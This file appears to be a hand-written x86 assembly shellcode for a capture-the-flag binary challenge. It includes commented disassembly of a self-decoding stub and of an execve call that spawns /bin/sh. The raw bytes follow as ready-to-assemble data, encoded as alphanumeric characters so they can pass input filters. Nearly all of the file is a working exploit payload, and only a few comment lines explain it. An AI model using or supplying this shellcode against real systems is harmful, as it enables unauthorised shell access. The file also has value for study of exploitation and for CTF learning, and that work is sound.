;Stub decoder
;|           0x08000110      6a69           push 0x69                   ; 'i' ; 105 ; [01] -r-x section size 48 named .text
;|           0x08000112      5b             pop ebx
;|           0x08000113      285a31         sub byte [edx + 0x31], bl
;|           0x08000116      285a3d         sub byte [edx + 0x3d], bl
;|           0x08000119      285a3d         sub byte [edx + 0x3d], bl
;|           0x0800011c      285a3e         sub byte [edx + 0x3e], bl
;|           0x0800011f      285a3f         sub byte [edx + 0x3f], bl
;|           0x08000122      285a3f         sub byte [edx + 0x3f], bl
;|           0x08000125      285a41         sub byte [edx + 0x41], bl
;|           0x08000128      285a42         sub byte [edx + 0x42], bl
;|           0x0800012b      285a43         sub byte [edx + 0x43], bl
;|           0x0800012e      285a44         sub byte [edx + 0x44], bl
;|           0x08000131      285a45         sub byte [edx + 0x45], bl
;|           0x08000134      285a46         sub byte [edx + 0x46], bl
;|           0x08000137      285a47         sub byte [edx + 0x47], bl
;|           0x0800013a      285a48         sub byte [edx + 0x48], bl
;\           0x0800013d      285a48         sub byte [edx + 0x48], bl

;Spawn /bin/sh:
;|           0x08000110      31c0           xor eax, eax                ; [01] -r-x section size 25 named .text
;|           0x08000112      50             push eax
;|           0x08000113      682f2f7368     push 0x68732f2f             ; '//sh'
;|           0x08000118      682f62696e     push 0x6e69622f             ; '/bin'
;|           0x0800011d      89e3           mov ebx, esp
;|           0x0800011f      99             cdq
;|           0x08000120      31c9           xor ecx, ecx
;|           0x08000122      b80b000000     mov eax, 0xb                ; 11
;\           0x08000127      cd80           int 0x80

; This alphanumeric shellcode requires EDX to be set to the address of the first byte of the shellcode
; in this shellcode the first byte is 0x6a.
; I created this shellcode for a binary challenge I was doing recently.
; In that challenge I was able to get EDX to point at the first byte of my shellcode and execute from EDX.
; This shellcode decodes part of itself and spawns /bin/sh

global _start
section .text
_start:
    db 0x6a,0x69,0x5b,0x28,0x5a,0x31,0x28,0x5a,0x3d,0x28,0x5a,0x3d,0x28,0x5a,0x3e,0x28,0x5a,0x3f,0x28,0x5a,0x3f,0x28,0x5a,0x41,0x28,0x5a,0x42,0x28,0x5a,0x43,0x28,0x5a,0x44,0x28,0x5a,0x45,0x28,0x5a,0x46,0x28,0x5a,0x47,0x28,0x5a,0x48,0x28,0x5a,0x48,0x31,0x29,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x5b,0x4c,0x6b,0x31,0x32,0x21,0x74,0x69,0x69,0x69,0x36,0x52
